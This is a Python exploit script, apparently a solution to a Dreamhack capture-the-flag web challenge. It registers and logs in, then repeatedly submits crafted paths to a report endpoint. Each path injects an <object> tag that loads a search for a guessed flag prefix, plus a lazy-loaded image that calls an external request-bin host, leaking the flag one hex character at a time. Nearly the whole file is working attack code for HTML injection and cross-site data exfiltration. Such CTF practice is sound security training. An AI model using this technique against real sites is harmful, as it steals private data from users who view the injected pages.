from requests import Session
from string import hexdigits
from time import sleep

info = lambda x: print(f"[+] {x}")
fail = lambda x: print(f"[-] {x}")

URL = "http://host3.dreamhack.games:24067/"
REQUEST_BIN_URL = "https://aqodgee.request.dreamhack.games"

sess = Session()
sess.post(f"{URL}/signup", data={"username": "guest2", "password": "guest"})
res = sess.post(f"{URL}/login", data={"username": "guest2", "password": "guest"})

if res.status_code == 200:
    info("Login Success")
else:
    fail("Login Failed...")

flag = "DH{"
lower_hexdigits = hexdigits[:-6]

for hexdigit in lower_hexdigits:
    html = f"""/search?keyword=asd</p><object data="/search?keyword={flag}{hexdigit}"><img src="{REQUEST_BIN_URL}/?callback={hexdigit}" loading="lazy"></object>"""
    sess.post(f"{URL}/report", data={"path": html})
    info(f"Trying: {flag}{hexdigit}")
    sleep(0.4)

info(f"Current flag: {flag}")
info("Check the Request Bin for the next character and update the flag manually.")
info(f"Final flag: {flag}")

// DH{ + FLAG 값을 넣으세요 예시 ) DH{example
